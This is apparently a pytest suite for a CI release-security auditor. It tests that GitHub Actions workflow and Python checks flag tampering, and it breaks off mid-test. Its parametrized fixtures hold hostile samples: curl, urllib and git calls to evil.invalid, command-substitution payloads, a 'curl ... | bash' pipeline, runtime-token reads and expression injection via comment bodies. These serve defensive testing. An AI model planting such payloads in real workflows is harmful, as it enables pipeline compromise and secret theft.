from __future__ import annotations

import ast
import copy
import importlib
from pathlib import Path

import pytest
import yaml

V2_ROOT = Path(__file__).resolve().parents[1]
REPOSITORY_ROOT = V2_ROOT.parents[2]
WORKFLOWS = tuple(
    REPOSITORY_ROOT / ".github/workflows" / name
    for name in (
        "develop-release-dry-run.yml",
        "draft-environment-dry-run.yml",
        "nightly-release-dry-run.yml",
        "pr-release-dry-run.yml",
        "release-cleanup-dry-run.yml",
        "release-control-dry-run.yml",
        "release-lifecycle-dry-run.yml",
        "repository-policy-audit-dry-run.yml",
    )
)


def _security():
    return importlib.import_module("ucm_release_v2.security")


def test_reusable_security_auditor_covers_nested_python_and_all_workflows() -> None:
    """The repository audit must include packaging guards, not only top-level modules."""
    findings = _security().audit_repository(V2_ROOT, WORKFLOWS)
    assert findings == []
    scanned = set(_security().python_audit_paths(V2_ROOT))
    assert V2_ROOT / "packaging/backend_guard.py" in scanned


def test_every_lifecycle_plan_consumer_uses_the_semantic_validator_or_wrapper() -> None:
    """No downstream consumer may regress to accepting a self-digest alone."""
    expected = {
        "artifacts.py": ("_lifecycle_plan", "validate_plan"),
        "environment.py": ("export_request", "validate_plan"),
        "reconcile.py": ("load_release_inputs", "validate_plan"),
        "render.py": ("render_release_preview", "load_release_inputs"),
        "wheels.py": ("_lifecycle_plan", "validate_plan"),
    }
    for filename, (function_name, validator_name) in expected.items():
        tree = ast.parse(
            (V2_ROOT / "ucm_release_v2" / filename).read_text(encoding="utf-8")
        )
        function = next(
            node
            for node in ast.walk(tree)
            if isinstance(node, ast.FunctionDef) and node.name == function_name
        )
        calls = {
            node.func.id
            for node in ast.walk(function)
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
        }
        assert validator_name in calls, filename
        direct_digest_only = [
            node
            for node in ast.walk(tree)
            if isinstance(node, ast.Call)
            and isinstance(node.func, ast.Name)
            and node.func.id == "verify_envelope"
            and any(
                keyword.arg == "kind"
                and isinstance(keyword.value, ast.Constant)
                and keyword.value.value == "lifecycle-plan"
                for keyword in node.keywords
            )
        ]
        assert direct_digest_only == [], filename


@pytest.mark.parametrize(
    "source",
    [
        "import os\nos.spawnv(os.P_WAIT, '/usr/bin/curl', ['curl', 'https://evil.invalid'])\n",
        "import asyncio\nasyncio.create_subprocess_exec('curl', 'https://evil.invalid')\n",
        "from os import unlink as erase\nerase('release.json')\n",
        "spec.loader.exec_module(module)\n",
    ],
)
def test_python_capability_audit_defaults_closed_for_reviewer_bypasses(
    source: str,
) -> None:
    """Unknown imports, aliases, loaders, and process APIs cannot gain capabilities."""
    assert _security().audit_python_source(source, "mutation.py")


def _replace_once(source: str, before: str, after: str) -> str:
    assert source.count(before) >= 1
    return source.replace(before, after, 1)


def _trust_step_document(workflow_name: str) -> dict[object, object]:
    source = (REPOSITORY_ROOT / ".github/workflows" / workflow_name).read_text(
        encoding="utf-8"
    )
    document = yaml.safe_load(source)
    assert isinstance(document, dict)
    return document


def _trust_step(
    document: dict[object, object], step_name: str
) -> tuple[list[object], dict[object, object]]:
    jobs = document["jobs"]
    assert isinstance(jobs, dict)
    matches: list[tuple[list[object], dict[object, object]]] = []
    for job in jobs.values():
        assert isinstance(job, dict)
        steps = job.get("steps", [])
        assert isinstance(steps, list)
        for step in steps:
            if isinstance(step, dict) and step.get("name") == step_name:
                matches.append((steps, step))
    assert len(matches) == 1
    return matches[0]


def _job_steps(document: dict[object, object], job_name: str) -> list[object]:
    jobs = document["jobs"]
    assert isinstance(jobs, dict)
    job = jobs[job_name]
    assert isinstance(job, dict)
    steps = job["steps"]
    assert isinstance(steps, list)
    return steps


def _pop_named_step(steps: list[object], step_name: str) -> dict[object, object]:
    matches = [
        (index, step)
        for index, step in enumerate(steps)
        if isinstance(step, dict) and step.get("name") == step_name
    ]
    assert len(matches) == 1
    index, step = matches[0]
    assert isinstance(step, dict)
    steps.pop(index)
    return step


def _mutated_trust_body(
    workflow_name: str, step_name: str, before: str, after: str
) -> str:
    document = _trust_step_document(workflow_name)
    _, step = _trust_step(document, step_name)
    run = step["run"]
    assert isinstance(run, str)
    assert run.count(before) == 1
    step["run"] = run.replace(before, after, 1)
    return yaml.safe_dump(document, sort_keys=False)


@pytest.mark.parametrize(
    ("before", "after"),
    [
        (
            'if os.environ["CONFIGURED_MAIN"] != "main":',
            "if False:",
        ),
        (
            'if os.environ["CALLER_REPOSITORY"] != repository:',
            "if False:",
        ),
        ('"workflow_sha",', '"workflow_sha_removed",'),
        (
            "if any(not isinstance(job_context[key], str) for key in required_job_keys):",
            "if False:",
        ),
        (
            'if job_context["workflow_repository"] != repository:',
            "if False:",
        ),
        (
            'if job_context["workflow_file_path"] != workflow_path:',
            "if False:",
        ),
        (
            'if job_context["workflow_ref"] != workflow_ref:',
            "if False:",
        ),
        (
            "SuperMarioYL/unified-cache-management/.github/workflows/release-control-dry-run.yml@refs/heads/main",
            "SuperMarioYL/unified-cache-management/.github/workflows/release-control-dry-run.yml@refs/tags/main",
        ),
        ('"policy-audit",', '"attacker-operation",'),
        (
            'if not re.fullmatch(r"[0-9a-f]{40}", workflow_sha):',
            "if False:",
        ),
        (
            'first = observed(Path(os.environ["RUNNER_TEMP"]) / "main-ref-first.json", "first")',
            "first = workflow_sha",
        ),
        (
            'second = observed(Path(os.environ["RUNNER_TEMP"]) / "main-ref-second.json", "second")',
            "second = workflow_sha",
        ),
        (
            "if first != second or first != workflow_sha:",
            "if False:",
        ),
    ],
    ids=(
        "configured-main",
        "caller-repository",
        "required-job-key",
        "required-job-key-type",
        "workflow-repository",
        "workflow-path",
        "workflow-ref-check",
        "tag-shadow-ref",
        "operation-allowlist",
        "workflow-sha-format",
        "first-main-observation",
        "second-main-observation",
        "two-main-observations-equality",
    ),
)
def test_trusted_reusable_controller_body_is_semantically_golden(
    before: str, after: str
) -> None:
    """Every trust predicate in the reusable controller is scanner-immutable."""
    workflow_name = "release-control-dry-run.yml"
    step_name = "Validate exact trusted reusable controller identity"
    source = _mutated_trust_body(workflow_name, step_name, before, after)

    findings = _security().audit_workflow_source(source, workflow_name)

    assert any(
        "trust-critical validator body differs" in finding.message
        for finding in findings
    ), findings


@pytest.mark.parametrize(
    ("before", "after"),
    [
        (
            'if os.environ["CONFIGURED_MAIN"] != "main" or os.environ["DEFAULT_BRANCH"] != "main" or os.environ["GITHUB_REF"] != "refs/heads/main" or os.environ["GITHUB_REF_NAME"] != "main":',
            "if False:",
        ),
        (
            'if os.environ["EVENT_REPOSITORY"] != "SuperMarioYL/unified-cache-management":',
            "if False:",
        ),
        (
            'if os.environ["WORKFLOW_NAME"] != "Push Commit Checks":',
            "if False:",
        ),
        (
            'if os.environ["WORKFLOW_EVENT"] != "push":',
            "if False:",
        ),
        (
            'if os.environ["WORKFLOW_PATH"] != ".github/workflows/push-check.yml@develop":',
            "if False:",
        ),
        (
            'if os.environ["WORKFLOW_CONCLUSION"] != "success":',
            "if False:",
        ),
        (
            'if os.environ["HEAD_BRANCH"] != "develop" or os.environ["HEAD_REPOSITORY"] != os.environ["EVENT_REPOSITORY"]:',
            "if False:",
        ),
        (
            'if not re.fullmatch(r"[0-9a-f]{40}", source_sha):',
            "if False:",
        ),
        (
            'first = observed(Path(os.environ["RUNNER_TEMP"]) / "main-ref-first.json", "first")',
            'first = os.environ["WORKFLOW_SHA"]',
        ),
        (
            'second = observed(Path(os.environ["RUNNER_TEMP"]) / "main-ref-second.json", "second")',
            'second = os.environ["WORKFLOW_SHA"]',
        ),
        (
            'if first != second or first != os.environ["WORKFLOW_SHA"]:',
            "if False:",
        ),
    ],
    ids=(
        "default-main-controller",
        "event-repository",
        "workflow-name",
        "workflow-event-push",
        "workflow-path-develop",
        "workflow-conclusion",
        "head-branch-and-repository",
        "head-sha-format",
        "first-main-observation",
        "second-main-observation",
        "two-main-observations-equality",
    ),
)
def test_develop_workflow_run_validator_body_is_semantically_golden(
    before: str, after: str
) -> None:
    """Every trusted workflow_run identity predicate is scanner-immutable."""
    workflow_name = "develop-release-dry-run.yml"
    step_name = "Validate trusted controller and develop source event"
    source = _mutated_trust_body(workflow_name, step_name, before, after)

    findings = _security().audit_workflow_source(source, workflow_name)

    assert any(
        "trust-critical validator body differs" in finding.message
        for finding in findings
    ), findings


@pytest.mark.parametrize(
    ("workflow_name", "step_name"),
    [
        (
            "release-control-dry-run.yml",
            "Validate exact trusted reusable controller identity",
        ),
        (
            "develop-release-dry-run.yml",
            "Validate trusted controller and develop source event",
        ),
    ],
)
@pytest.mark.parametrize("mutation", ["delete", "duplicate", "rename"])
def test_trust_critical_validator_step_is_present_exactly_once(
    workflow_name: str, step_name: str, mutation: str
) -> None:
    """Deleting, duplicating, or renaming either trust gate must fail closed."""
    document = _trust_step_document(workflow_name)
    steps, step = _trust_step(document, step_name)
    index = steps.index(step)
    if mutation == "delete":
        steps.pop(index)
    elif mutation == "duplicate":
        steps.insert(index + 1, copy.deepcopy(step))
    else:
        step["name"] = f"{step_name} renamed"

    findings = _security().audit_workflow_source(
        yaml.safe_dump(document, sort_keys=False), workflow_name
    )

    assert any(
        "trust-critical validator step must appear exactly once" in finding.message
        for finding in findings
    ), findings


@pytest.mark.parametrize(
    "mutation",
    [
        "controller-move-to-release-job",
        "controller-duplicate-in-release-job",
        "controller-wrong-index",
        "develop-after-business-cli",
        "develop-checkout-before-validator",
    ],
)
def test_trust_critical_validator_is_bound_to_exact_job_and_index(
    mutation: str,
) -> None:
    """A valid body/name cannot retain authority under the wrong owner or order."""
    if mutation.startswith("controller-"):
        workflow_name = "release-control-dry-run.yml"
        step_name = "Validate exact trusted reusable controller identity"
        document = _trust_step_document(workflow_name)
        control_steps = _job_steps(document, "control")
        if mutation == "controller-duplicate-in-release-job":
            _, step = _trust_step(document, step_name)
            _job_steps(document, "release-preview").append(copy.deepcopy(step))
        else:
            step = _pop_named_step(control_steps, step_name)
            if mutation == "controller-move-to-release-job":
                _job_steps(document, "release-preview").append(step)
            else:
                control_steps.insert(0, step)
    else:
        workflow_name = "develop-release-dry-run.yml"
        step_name = "Validate trusted controller and develop source event"
        document = _trust_step_document(workflow_name)
        develop_steps = _job_steps(document, "develop-preview")
        if mutation == "develop-after-business-cli":
            develop_steps.append(_pop_named_step(develop_steps, step_name))
        else:
            develop_steps[2], develop_steps[3] = develop_steps[3], develop_steps[2]

    findings = _security().audit_workflow_source(
        yaml.safe_dump(document, sort_keys=False), workflow_name
    )

    assert any(
        "trust-critical validator location/body differs" in finding.message
        for finding in findings
    ), findings
    assert any(
        "ordered step sequence differs" in finding.message for finding in findings
    ), findings


@pytest.mark.parametrize(
    "mutation",
    [
        "nightly-swap-checkout-and-setup",
        "pr-delete-summary",
        "controller-duplicate-action",
        "controller-move-business-step-across-jobs",
    ],
)
def test_every_executable_job_has_an_exact_ordered_step_sequence(
    mutation: str,
) -> None:
    """Non-trust steps also cannot move, reorder, duplicate, or disappear."""
    if mutation == "nightly-swap-checkout-and-setup":
        workflow_name = "nightly-release-dry-run.yml"
        document = _trust_step_document(workflow_name)
        steps = _job_steps(document, "nightly-preview")
        steps[0], steps[1] = steps[1], steps[0]
    elif mutation == "pr-delete-summary":
        workflow_name = "pr-release-dry-run.yml"
        document = _trust_step_document(workflow_name)
        steps = _job_steps(document, "pull-request-preview")
        _pop_named_step(steps, "Write PR preview summary")
    elif mutation == "controller-duplicate-action":
        workflow_name = "release-control-dry-run.yml"
        document = _trust_step_document(workflow_name)
        steps = _job_steps(document, "policy-audit")
        steps.insert(2, copy.deepcopy(steps[1]))
    else:
        workflow_name = "release-control-dry-run.yml"
        document = _trust_step_document(workflow_name)
        source_steps = _job_steps(document, "simulated-environment")
        moved = _pop_named_step(
            source_steps, "Create deterministic offline artifact fixtures"
        )
        _job_steps(document, "cleanup-preview").append(moved)

    findings = _security().audit_workflow_source(
        yaml.safe_dump(document, sort_keys=False), workflow_name
    )

    assert any(
        "ordered step sequence differs" in finding.message for finding in findings
    ), findings


def test_ordered_step_sequence_policy_has_no_orphan_executable_job() -> None:
    """Every executable job must have one reviewed sequence and vice versa."""
    workflow_name = "release-control-dry-run.yml"
    document = _trust_step_document(workflow_name)
    jobs = document["jobs"]
    assert isinstance(jobs, dict)
    jobs["orphan-executable-job"] = copy.deepcopy(jobs["control"])

    findings = _security().audit_workflow_source(
        yaml.safe_dump(document, sort_keys=False), workflow_name
    )

    assert any(
        "executable job step-sequence coverage differs" in finding.message
        for finding in findings
    ), findings


def _wheels_source() -> str:
    return (V2_ROOT / "ucm_release_v2/wheels.py").read_text(encoding="utf-8")


@pytest.mark.parametrize(
    "source",
    [
        _wheels_source().replace(
            '_PACKAGING_ROOT = _V2_ROOT / "packaging"',
            '_PACKAGING_ROOT = Path("/tmp")',
            1,
        ),
        _wheels_source().replace(
            "def _guard_module() -> Any:",
            '_PACKAGING_ROOT = Path("/tmp")\n\n\ndef _guard_module() -> Any:',
            1,
        ),
    ],
)
def test_backend_guard_path_provenance_rejects_replacement_or_late_rebind(
    source: str,
) -> None:
    """The approved loader path must derive only from the shipped module location."""
    findings = _security().audit_python_source(
        source, str(V2_ROOT / "ucm_release_v2/wheels.py")
    )
    assert any("path provenance" in finding.message for finding in findings), findings


@pytest.mark.parametrize(
    "statement",
    [
        '_V2_ROOT = Path("/tmp")',
        '_PACKAGING_ROOT /= "attacker"',
        '_PACKAGING_ROOT: Path = Path("/tmp")',
        '(_V2_ROOT, alias) = (Path("/tmp"), _V2_ROOT)',
        'if (_PACKAGING_ROOT := Path("/tmp")):\n    pass',
        'globals()["_PACKAGING_ROOT"] = Path("/tmp")',
        'locals()["_PACKAGING_ROOT"] = Path("/tmp")',
        'setattr(module, "_PACKAGING_ROOT", Path("/tmp"))',
        'del _PACKAGING_ROOT\n_PACKAGING_ROOT = Path("/tmp")',
    ],
)
def test_backend_guard_path_provenance_rejects_extra_store_delete_or_namespace_mutation(
    statement: str,
) -> None:
    """Every adjacent rebinding form must invalidate the repository-owned path proof."""
    source = _wheels_source().replace(
        "def _guard_module() -> Any:",
        f"{statement}\n\n\ndef _guard_module() -> Any:",
        1,
    )
    assert _security().audit_python_source(
        source, str(V2_ROOT / "ucm_release_v2/wheels.py")
    )


@pytest.mark.parametrize(
    "replacement",
    [
        """module = importlib.util.module_from_spec(spec)
    spec = attacker_spec
    module = attacker_module
    spec.loader.exec_module(module)""",
        """module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    second_spec = importlib.util.spec_from_file_location(
        "ucm_release_v2_backend_guard", _PACKAGING_ROOT / "backend_guard.py"
    )
    second_module = importlib.util.module_from_spec(second_spec)
    second_spec.loader.exec_module(second_module)""",
        """module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    spec = importlib.util.spec_from_file_location(
        "attacker", _PACKAGING_ROOT / "backend_guard.py"
    )
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)""",
        """module = importlib.util.module_from_spec(spec)
    module = attacker_module
    spec.loader.exec_module(module)""",
        """module = importlib.util.module_from_spec(spec)
    loader = spec.loader
    loader.exec_module(module)""",
    ],
)
def test_backend_guard_loader_exception_requires_exact_function_dataflow(
    replacement: str,
) -> None:
    """Any reassignment, second loader, or aliased execution invalidates the exception."""
    source = _replace_once(
        _wheels_source(),
        """module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)""",
        replacement,
    )
    findings = _security().audit_python_source(
        source, str(V2_ROOT / "ucm_release_v2/wheels.py")
    )
    assert any("loader" in finding.message for finding in findings), findings


@pytest.mark.parametrize(
    ("mutation", "needle"),
    [
        ("variable-curl", "executable"),
        ("git-clone", "executable"),
        ("pip-download", "executable"),
        ("docker-pull", "executable"),
        ("openssl-client", "executable"),
        ("command-python", "heredoc"),
        ("env-python", "heredoc"),
        ("gh-tab", "executable"),
        ("curl-short-redirect", "curl"),
        ("curl-duplicate-method", "curl"),
        ("curl-pipeline", "pipeline"),
        ("checkout-path-expression", "checkout path"),
    ],
)
def test_workflow_capability_audit_defaults_closed_for_reviewer_bypasses(
    mutation: str, needle: str
) -> None:
    """Every executable and argument must remain inside the reviewed workflow grammar."""
    source = (REPOSITORY_ROOT / ".github/workflows/pr-release-dry-run.yml").read_text(
        encoding="utf-8"
    )
    injection = {
        "variable-curl": (
            "set -euo pipefail",
            "set -euo pipefail\n          NET=curl\n          $NET --request GET https://evil.invalid",
        ),
        "git-clone": (
            "set -euo pipefail",
            "set -euo pipefail\n          git clone https://evil.invalid/repository.git",
        ),
        "pip-download": (
            "set -euo pipefail",
            "set -euo pipefail\n          python -m pip download attacker-package",
        ),
        "docker-pull": (
            "set -euo pipefail",
            "set -euo pipefail\n          docker pull evil.invalid/image:latest",
        ),
        "openssl-client": (
            "set -euo pipefail",
            "set -euo pipefail\n          openssl s_client -connect evil.invalid:443",
        ),
        "command-python": ("python - <<'PY'", "command python - <<'PY'"),
        "env-python": ("python - <<'PY'", "/usr/bin/env python - <<'PY'"),
        "gh-tab": (
            "set -euo pipefail",
            "set -euo pipefail\n          gh\tapi repos/example/repository",
        ),
        "curl-short-redirect": (
            "curl --request GET --fail",
            "curl --request GET -L --fail",
        ),
        "curl-duplicate-method": (
            "curl --request GET --fail",
            "curl --request GET -XDELETE --fail",
        ),
        "curl-pipeline": (
            '--output "$RUNNER_TEMP/observed-pr.json"',
            '--output "$RUNNER_TEMP/observed-pr.json" | jq -r .head.sha | bash',
        ),
        "checkout-path-expression": (
            "path: control",
            "path: ${{ github.event.pull_request.head.ref }}",
        ),
    }[mutation]
    findings = _security().audit_workflow_source(
        _replace_once(source, *injection), "pr-release-dry-run.yml"
    )
    assert any(needle in finding.message for finding in findings), findings


@pytest.mark.parametrize(
    "payload",
    [
        "$(curl --request GET https://evil.invalid)",
        "`curl --request GET https://evil.invalid`",
        "<(curl --request GET https://evil.invalid)",
        ">(curl --request GET https://evil.invalid)",
        '<<< "attacker"',
        "> /tmp/leak",
        "2> /tmp/leak",
        "3>&1",
        "$(printf x)$(curl --request GET https://evil.invalid)",
        "${ACTOR:-$(curl --request GET https://evil.invalid)}",
        "${ACTIONS_RUNTIME_TOKEN}",
        "$ACTIONS_RUNTIME_TOKEN",
    ],
)
def test_shell_audit_rejects_expansions_process_substitution_and_redirection(
    payload: str,
) -> None:
    """Catches shlex treating active shell syntax as an inert CLI argument."""
    source = (REPOSITORY_ROOT / ".github/workflows/pr-release-dry-run.yml").read_text(
        encoding="utf-8"
    )
    mutated = _replace_once(source, '--actor "$ACTOR"', f'--actor "{payload}"')

    findings = _security().audit_workflow_source(mutated, "pr-release-dry-run.yml")

    assert any(
        any(
            word in finding.message
            for word in ("expansion", "substitution", "redirection", "metachar")
        )
        for finding in findings
    ), findings


@pytest.mark.parametrize(
    ("before", "after", "needle"),
    [
        (
            "name: Generate and validate PR lifecycle preview",
            "name: Generate and validate PR lifecycle preview\n        shell: ${{ github.event.comment.body }}",
            "step keys",
        ),
        (
            "name: Generate and validate PR lifecycle preview",
            "name: Generate and validate PR lifecycle preview\n        shell: bash -c {0}",
            "step keys",
        ),
        (
            "runs-on: ubuntu-24.04",
            "runs-on: ubuntu-24.04\n    container:\n      image: ${{ github.event.comment.body }}",
            "job keys",
        ),
        (
            "permissions:\n  contents: read",
            "permissions:\n  contents: read\ndefaults:\n  run:\n    shell: ${{ github.event.comment.body }}",
            "workflow keys",
        ),
        (
            "runs-on: ubuntu-24.04",
            "runs-on: ubuntu-24.04\n    services:\n      db:\n        image: attacker/image:latest",
            "job keys",
        ),
        (
            "runs-on: ubuntu-24.04",
            "runs-on: ubuntu-24.04\n    uses: attacker/repository/.github/workflows/write.yml@main",
            "job keys",
        ),
        (
            "runs-on: ubuntu-24.04",
            "runs-on: ${{ github.event.comment.body }}",
            "runs-on",
        ),
    ],
)
def test_workflow_execution_context_is_closed_by_root_job_and_step_shape(
    before: str, after: str, needle: str
) -> None:
    """Unreviewed shells, containers, services, reusable jobs, and runners must fail."""
    source = (REPOSITORY_ROOT / ".github/workflows/pr-release-dry-run.yml").read_text(
        encoding="utf-8"
    )
    findings = _security().audit_workflow_source(
        _replace_once(source, before, after), "pr-release-dry-run.yml"
    )
    assert any(needle in finding.message for finding in findings), findings


@pytest.mark.parametrize(
    ("surface", "mutation", "needle"),
    [
        ("python", "eval('1 + 1')\n", "eval"),
        ("python", "compile('1', '<x>', 'exec')\n", "compile"),
        ("python", "__import__('urllib.request')\n", "dynamic import"),
        (
            "python",
            "import importlib\nimportlib.import_module('http.client')\n",
            "dynamic import",
        ),
        ("python", "getattr(object(), 'request')\n", "getattr"),
        ("python", "import os\nos.execv('/bin/echo', ['echo'])\n", "execv"),
        ("python", "danger = eval\ndanger('1 + 1')\n", "eval"),
        (
            "python",
            "import urllib.request\nurllib.request.urlopen('https://evil.invalid')\n",
            "urllib",
        ),
        ("python", "from pathlib import Path\nPath('x').unlink()\n", "unlink"),
        ("python", "def publish_release():\n    pass\n", "publish_release"),
        (
            "workflow",
            "uses: attacker/example@" + "1" * 40,
            "action allowlist",
        ),
        (
            "workflow",
            'run: echo "${{ github.event.pull_request.title }}"',
            "expression",
        ),
        (
            "workflow",
            "run: |\n  python - <<'PY'\n  import requests\n  requests.get('https://evil.invalid')\n  PY",
            "requests",
        ),
        (
            "workflow",
            "run: |\n  PYTHONPATH=. python3 - <<'PY'\n  import urllib.request\n  urllib.request.urlopen('https://evil.invalid')\n  PY",
            "urllib",
        ),
        (
            "workflow",
            "run: curl --request GET https://evil.invalid/data",
            "network endpoint",
        ),
        (
            "workflow",
            "run: curl --request POST https://api.github.com/repos/x/y",
            "network endpoint",
        ),
        (
            "workflow",
            "run: |\n  curl --request GET https://api.github.com/repos/${REPOSITORY}/pulls/${PR_NUMBER} https://evil.invalid",
            "network endpoint",
        ),
        ("workflow", "run: docker push example.invalid/ucm:test", "docker push"),
        ("workflow", "run: rm -f preview/release.json", "destructive shell"),
        ("workflow", "run: gh repo edit --enable-issues=false", "gh "),
        (
            "workflow",
            "uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n"
            "with:\n  ref: ${{ github.event.pull_request.head.sha }}\n  persist-credentials: false",
            "head-controlled checkout",
        ),
        ("workflow", 'run: eval "$HEAD_COMMAND"', "shell eval"),
    ],
)
def test_security_auditor_detects_reviewer_bypass_mutations(
    surface: str, mutation: str, needle: str
) -> None:
    auditor = _security()
    if surface == "python":
        findings = auditor.audit_python_source(mutation, "mutation.py")
    else:
        source = (
            "on: {workflow_dispatch: {}}\n"
            "permissions: {contents: read}\n"
            "jobs:\n  audit:\n    permissions: {contents: read}\n"
            "    runs-on: ubuntu-24.04\n    steps:\n      - "
            + mutation.replace("\n", "\n        ")
            + "\n"
        )
        findings = auditor.audit_workflow_source(source, "pr-release-dry-run.yml")
    assert any(needle in finding.message for finding in findings), findings


def test_security_auditor_rejects_write_permissions() -> None:
    source = (
        "on: {workflow_dispatch: {}}\n"
        "permissions: {contents: write}\n"
        "jobs:\n  audit:\n    permissions: {contents: read}\n"
        "    runs-on: ubuntu-24.04\n    steps: []\n"
    )
    findings = _security().audit_workflow_source(source, "mutation.yml")
    assert any("root permissions" in finding.message for finding in findings)


def test_nightly_uses_trusted_control_and_two_strict_readonly_develop_reads() -> None:
    source = WORKFLOWS[2].read_text(encoding="utf-8")
    assert "ref: ${{ github.workflow_sha }}" in source
    assert (
        source.count(
            "https://api.github.com/repos/${REPOSITORY}/git/ref/heads/${DEVELOP_BRANCH}"
        )
        == 2
    )
    assert source.count("--request GET") == 2
    assert '--ref "refs/heads/$DEVELOP_BRANCH"' in source
    assert "SOURCE_SHA: ${{ steps.develop.outputs.source_sha }}" in source


@pytest.mark.parametrize(
    "mutation", ["stale", "malformed", "ref-mismatch", "sha-mismatch"]
)
def test_nightly_develop_response_validation_fails_closed(mutation: str) -> None:
    validator = importlib.import_module("ucm_release_v2.github_readonly")
    sha = "a" * 40
    first: object = {
        "ref": "refs/heads/develop",
        "object": {"sha": sha, "type": "commit"},
    }
    second: object = {
        "ref": "refs/heads/develop",
        "object": {"sha": sha, "type": "commit"},
    }
    if mutation == "stale":
        second = {
            "ref": "refs/heads/develop",
            "object": {"sha": "b" * 40, "type": "commit"},
        }
    elif mutation == "malformed":
        first = {
            "ref": "refs/heads/develop",
            "object": {"sha": "not-a-sha", "type": "commit"},
        }
    elif mutation == "ref-mismatch":
        first = {"ref": "refs/heads/main", "object": {"sha": sha, "type": "commit"}}
    else:
        first = {"ref": "refs/heads/develop", "object": {"sha": sha, "type": "tag"}}
    with pytest.raises(validator.ReadOnlyGitHubError):
        validator.validate_develop_reads(first, second, branch="develop")


def test_nightly_develop_response_validation_accepts_default_main_control() -> None:
    validator = importlib.import_module("ucm_release_v2.github_readonly")
    sha = "a" * 40
    response = {"ref": "refs/heads/develop", "object": {"sha": sha, "type": "commit"}}
    assert (
        validator.validate_control_identity(
            configured_main="main", event_default_branch="main", event_ref_name="main"
        )
        == "main"
    )
    assert validator.validate_develop_reads(response, response, branch="develop") == sha


@pytest.mark.parametrize(
    "mutation",
    [
        "configured-main",
        "workflow-ref",
        "workflow-sha",
        "workflow-repository",
        "workflow-path",
        "job-context-missing",
        "job-context-type",
        "repository",
        "first-sha",
        "second-sha",
        "type",
        "duplicate-json",
    ],
)
def test_manual_control_gate_rejects_nonmain_stale_or_wrong_repository(
    tmp_path: Path, mutation: str
) -> None:
    """Catches workflow_dispatch loading control from a selectable or stale ref."""
    validator = importlib.import_module("ucm_release_v2.github_readonly")
    sha = "a" * 40
    first: object = {
        "ref": "refs/heads/main",
        "object": {"sha": sha, "type": "commit"},
    }
    second: object = {
        "ref": "refs/heads/main",
        "object": {"sha": sha, "type": "commit"},
    }
    context = {
        "configured_main": "main",
        "repository": "SuperMarioYL/unified-cache-management",
        "allowed_repositories": ("SuperMarioYL/unified-cache-management",),
        "job_context": {
            "workflow_ref": "SuperMarioYL/unified-cache-management/.github/workflows/release-control-dry-run.yml@refs/heads/main",
            "workflow_sha": sha,
            "workflow_repository": "SuperMarioYL/unified-cache-management",
            "workflow_file_path": ".github/workflows/release-control-dry-run.yml",
        },
    }
    if mutation == "configured-main":
        context["configured_main"] = "develop"
    elif mutation == "workflow-ref":
        context["job_context"]["workflow_ref"] = "SuperMarioYL/unified-cache-management/.github/workflows/release-control-dry-run.yml@refs/heads/develop"  # type: ignore[index]
    elif mutation == "workflow-sha":
        context["job_context"]["workflow_sha"] = "b" * 40  # type: ignore[index]
    elif mutation == "workflow-repository":
        context["job_context"]["workflow_repository"] = "attacker/unified-cache-management"  # type: ignore[index]
    elif mutation == "workflow-path":
        context["job_context"]["workflow_file_path"] = ".github/workflows/attacker.yml"  # type: ignore[index]
    elif mutation == "job-context-missing":
        context["job_context"].pop("workflow_ref")  # type: ignore[union-attr]
    elif mutation == "job-context-type":
        context["job_context"]["workflow_sha"] = 1  # type: ignore[index]
    elif mutation == "repository":
        context["repository"] = "attacker/unified-cache-management"
    elif mutation == "first-sha":
        first["object"]["sha"] = "b" * 40  # type: ignore[index]
    elif mutation == "second-sha":
        second["object"]["sha"] = "b" * 40  # type: ignore[index]
    elif mutation == "type":
        first["object"]["type"] = "tag"  # type: ignore[index]
    else:
        path = tmp_path / "duplicate.json"
        path.write_text(
            '{"ref":"refs/heads/main","object":{"type":"commit","sha":"'
            + sha
            + '","sha":"'
            + sha
            + '"}}',
            encoding="utf-8",
        )
        with pytest.raises(validator.ReadOnlyGitHubError, match="duplicate key"):
            validator.load_json(path, "main ref")
        return

    with pytest.raises(validator.ReadOnlyGitHubError):
        validator.validate_reusable_control_reads(first, second, **context)


def test_manual_control_gate_accepts_github_generated_job_context_fields() -> None:
    """Catches rejecting normal status/container/services fields from toJSON(job)."""
    validator = importlib.import_module("ucm_release_v2.github_readonly")
    sha = "a" * 40
    response = {
        "ref": "refs/heads/main",
        "object": {"sha": sha, "type": "commit"},
    }
    assert (
        validator.validate_reusable_control_reads(
            response,
            response,
            configured_main="main",
            repository="SuperMarioYL/unified-cache-management",
            allowed_repositories=("SuperMarioYL/unified-cache-management",),
            job_context={
                "workflow_ref": "SuperMarioYL/unified-cache-management/.github/workflows/release-control-dry-run.yml@refs/heads/main",
                "workflow_sha": sha,
                "workflow_repository": "SuperMarioYL/unified-cache-management",
                "workflow_file_path": ".github/workflows/release-control-dry-run.yml",
                "status": "success",
                "check_run_id": 123,
                "container": {"id": "", "network": ""},
                "services": {},
            },
        )
        == sha
    )


def test_manual_control_gate_accepts_two_exact_main_reads() -> None:
    """Catches rejecting the one approved validation-repository main control identity."""
    validator = importlib.import_module("ucm_release_v2.github_readonly")
    sha = "a" * 40
    response = {
        "ref": "refs/heads/main",
        "object": {"sha": sha, "type": "commit"},
    }

    assert (
        validator.validate_reusable_control_reads(
            response,
            response,
            configured_main="main",
            repository="SuperMarioYL/unified-cache-management",
            allowed_repositories=("SuperMarioYL/unified-cache-management",),
            job_context={
                "workflow_ref": "SuperMarioYL/unified-cache-management/.github/workflows/release-control-dry-run.yml@refs/heads/main",
                "workflow_sha": sha,
                "workflow_repository": "SuperMarioYL/unified-cache-management",
                "workflow_file_path": ".github/workflows/release-control-dry-run.yml",
            },
        )
        == sha
    )


@pytest.mark.parametrize(
    "mutation",
    ["name", "conclusion", "branch", "head-repository", "event-repository", "sha"],
)
def test_workflow_run_develop_event_validator_rejects_untrusted_identity(
    mutation: str,
) -> None:
    """Catches a workflow_run from the wrong workflow/repository/branch becoming source data."""
    validator = importlib.import_module("ucm_release_v2.github_readonly")
    values = {
        "workflow_name": "Push Commit Checks",
        "workflow_event": "push",
        "workflow_path": ".github/workflows/push-check.yml@develop",
        "conclusion": "success",
        "head_branch": "develop",
        "head_repository": "SuperMarioYL/unified-cache-management",
        "event_repository": "SuperMarioYL/unified-cache-management",
        "head_sha": "a" * 40,
